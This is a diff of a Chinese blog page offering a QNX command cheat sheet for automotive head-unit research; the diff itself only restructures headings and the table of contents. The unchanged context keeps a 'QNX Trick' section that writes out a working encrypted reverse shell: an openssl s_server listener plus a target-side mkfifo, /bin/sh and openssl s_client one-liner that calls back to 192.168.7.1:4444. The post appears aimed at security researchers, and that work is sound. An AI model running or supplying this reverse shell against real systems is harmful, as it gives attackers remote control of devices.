@@ -15,7 +15,7 @@
 <meta property="og:locale">
 <meta property="og:image" content="http://delikey.github.io/2022/02/28/QNX-Command-Cheatsheet/QNX-Command-Cheatsheet.png">
 <meta property="article:published_time" content="2022-02-28T15:15:00.000Z">
-<meta property="article:modified_time" content="2022-02-28T15:24:27.499Z">
+<meta property="article:modified_time" content="2022-02-28T16:03:22.819Z">
 <meta property="article:author" content="Delikely">
 <meta property="article:tag" content="Automotive">
 <meta name="twitter:card" content="summary">
@@ -103,7 +103,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#QNX-%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">QNX 命令备忘录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.1.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#QNX-%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">QNX 命令备忘录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#QNX-Trick"><span class="toc-number">1.1.</span> <span class="toc-text">QNX Trick</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Command-Cheat-Sheet"><span class="toc-number">1.2.</span> <span class="toc-text">Command Cheat Sheet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.3.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
     </div>
   </span>
 </div>
@@ -146,8 +146,7 @@
 <p>QNX 是加拿大 RIM 公司旗下，采用微内核的类Unix实时操作系统。其以安全性和实时性著称，主要是面向嵌入式系统。QNX 在汽车领域市场占有量较大，大多数汽车制造商均有使用，多做为车机和仪表底层操作系统。</p>
 </blockquote>
 <p>最近发现不少小伙伴在研究 QNX 车机，其中有部分人是第一次接触 QNX，相信后面会有越来越多的人会接触到QNX。由于 QNX 是遵从 POSIX 规范的类 Unix 实时操作系统，简单操作上手难度不大，但有一些命令与大家熟知的LINUX还是有差异的。自己最近也在研究 QNX，遇到了不大少的坑，为方便大家使用，特别制作 QNX 命令备忘录。现在发布第一版V0.1，其中可能存在不少纰漏，欢迎反馈。</p>
-<p><strong>QNX Trick</strong></p>
-<p>以下是 QNX Command Cheat Sheet 中比较有意思的三个命令。</p>
+<h3 id="QNX-Trick"><a href="#QNX-Trick" class="headerlink" title="QNX Trick"></a>QNX Trick</h3><p>以下是 QNX Command Cheat Sheet 中比较有意思的三个命令。</p>
 <ol>
 <li><p>use</p>
 <p>在 Linux 中这么一句话——有困难找 “男人”。指的是在 Linux 中不清楚一个命令的作用和用法时，通常会使用 man 命令获取使用帮助。但在 QNX 不仅找 man 没有用， -h/-help 对大多数命令也不起作用。那么 QNX 中该怎么获取命令帮助，其实 use 就是 QNX 的 -h/–help。当忘记某个命令的用法时，记得使用 <code>use command(需要查询的命令)</code>获取帮助信息。</p>
@@ -161,7 +160,7 @@
 <p>QNX 反弹 Shell 比较受限，大部分情况下没有 nc/netcat，也没用到 busybox，就连常用的下载命令wget、curl 也没有。能执行任意命令却拿不到反弹 Shell，就很让人抓狂。那么是否有通用的反弹shell方法，我还真找到了一个冷门的反弹 shell 方法，现在分享给大家，Linux 和 QNX 上都能使用。</p>
 <p>现在大家越来越注重安全，Openssl 使用也相当广泛。Openssl 是一个很好的工具，降低了大家使用加解密的门槛。Openssl 一般用来加解密，很少被注意到其实还能进行网络通信。Openssl 的 s_client 是一个SSL/TLS客户端程序，与 s_server 对应，它不仅能与 s_server 进行通信，也能与任何使用ssl协议的其他服务程序进行通信。利用这一特性可以实现反弹 shell。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 监听</span></span><br><span class="line">openssl s_server -quiet -key server.key -cert server.pem -port 4444                         </span><br><span class="line"><span class="comment"># 目标端  </span></span><br><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.7.1:4444 &gt; /tmp/s; rm /tmp/s </span><br></pre></td></tr></table></figure>
-<p> 更多请下载 <a target="_blank" rel="noopener" href="https://github.com/delikely/Wiki/blob/main/cheatsheet/QNX/QNX Command Cheatsheet V0.1.png">QNX Command Cheat Sheet</a> “食用”。</p>
+<h3 id="Command-Cheat-Sheet"><a href="#Command-Cheat-Sheet" class="headerlink" title="Command Cheat Sheet"></a>Command Cheat Sheet</h3><p> 更多请下载 <a target="_blank" rel="noopener" href="https://github.com/delikely/Wiki/blob/main/cheatsheet/QNX/QNX Command Cheatsheet V0.1.png">QNX Command Cheat Sheet</a> “食用”。</p>
 <p><img src="QNX-Command-Cheatsheet.png" alt="QNX Command cheatsheet"></p>
 </li>
 </ol>
@@ -195,7 +194,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#QNX-%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">QNX 命令备忘录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.1.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#QNX-%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">QNX 命令备忘录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#QNX-Trick"><span class="toc-number">1.1.</span> <span class="toc-text">QNX Trick</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Command-Cheat-Sheet"><span class="toc-number">1.2.</span> <span class="toc-text">Command Cheat Sheet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.3.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
